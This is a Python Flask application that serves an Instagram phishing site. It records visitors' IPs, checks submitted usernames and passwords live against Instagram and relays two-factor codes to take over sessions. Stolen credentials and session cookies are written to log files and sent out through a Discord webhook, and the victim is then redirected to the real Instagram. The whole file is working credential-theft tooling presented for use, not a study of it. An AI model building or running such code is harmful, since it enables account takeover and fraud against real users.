import os
import datetime
import pytz
import logging
import json
import requests
from flask import Flask, render_template, request, redirect
from dotenv import load_dotenv
from app.instagram_api import IsExists,two_factor
from app.functions import  edit_cookies, first_art, correct_all, wrong_answer, twoFA_active,twoFA_correct
from colorama import Fore, Style
import concurrent.futures

app = Flask(__name__)
load_dotenv()

DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')
username = None
password = None
user_agent = None
two_factor_identifier = None



def send_webhook_message(webhook_url, message):
    data = {
        "content": "```\n" + message + "```"
    }
    headers = {
        'Content-Type': 'application/json',
    }
    try:
        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
        response.raise_for_status()
        print(f"\n{Fore.GREEN}Message sent to Discord.{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"\n{Fore.RED}Error sending message to Discord: {e}{Style.RESET_ALL}")



@app.route('/')
def index():
    global user_agent
    time_zone = "Asia/Baku"  # You can change it
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')

    utc_now = datetime.datetime.now(datetime.timezone.utc)
    baku_tz = pytz.timezone(time_zone)
    baku_now = utc_now.astimezone(baku_tz)
    visit_time = baku_now.strftime("%Y-%m-%d %H:%M:%S")
    
    if user_agent is not None:
        first_art(visit_time, user_ip, user_agent)
        with open('output/ip_agent.log', 'a') as f:
            f.write(f"\n\n\n\nEnter website in: {visit_time} \nIP: {user_ip}\nUser-Agent: {user_agent}\n")
    
    return render_template('index.html')




@app.route('/submit', methods=['POST','GET'])
def submit():
    global username, password, user_agent, two_factor_identifier
    username = request.form['username']
    password = request.form['password']
    result, cookies = IsExists(username, password, user_agent)

    if result and result.get("status") == "ok" and result.get("authenticated") is not None and result.get("authenticated"):
        cookies = edit_cookies(cookies)
        correct_all(username, password, cookies)
        with open('output/pass_user.log', 'a') as f:
            f.write(f"\nUsername: {username}\nPassword: {password}\n{cookies}\n")
        message = "Username: " + username + "\nPassword: " + password + "\n\n" + "\t\tCookies\n" + cookies
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(send_webhook_message, DISCORD_WEBHOOK_URL, message)
            result = future.result()
        return redirect("https://www.instagram.com")

    elif result.get("two_factor_required"):
        print("TWO factor acik. ")
        two_factor_identifier = result.get("two_factor_info", {}).get("two_factor_identifier")
        with open('output/pass_user.log', 'a') as f:
            f.write(f"\nUsername: {username}\nPassword: {password}")
        twoFA_active(username,password)
        return redirect("/twoFA")
   
    else:
        wrong_answer(username, password)
        with open('output/wrong_pass.log', 'a') as f:
            f.write(f"\nUsername: {username}\nPassword: {password}\n")
        return render_template('/error.html')




@app.route('/twoFA', methods=['GET', 'POST'])
def twoFA():
    global username, password, user_agent, two_factor_identifier

    if request.method == 'POST':
        code = request.form['code']
        result,cookies = two_factor(code,two_factor_identifier,username,user_agent)
        
        if result.get("authenticated") is not None and result.get("authenticated"):
            message = "Username: " + username + "\nPassword: " + password + "\n\n" + "\t\tCookies\n" + cookies
            cookies = edit_cookies(cookies)
            twoFA_correct(cookies)
            with open('output/pass_user.log', 'a') as f:
                f.write(f"{cookies}\n")
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.submit(send_webhook_message, DISCORD_WEBHOOK_URL, message)
        else:
            return render_template('/twoFA_error.html')
    
    else:
        return render_template('twoFA.html')

    return redirect("https://www.instagram.com")


if __name__ == '__main__':
    try:
        log = logging.getLogger('werkzeug')
        log.disabled = False
        logging.disable(logging.CRITICAL)
        host = '0.0.0.0'
        port = 8080
        app.run(host=host, port=port)
    except:
        print(Fore.RED + "EXIT" + Style.RESET_ALL)
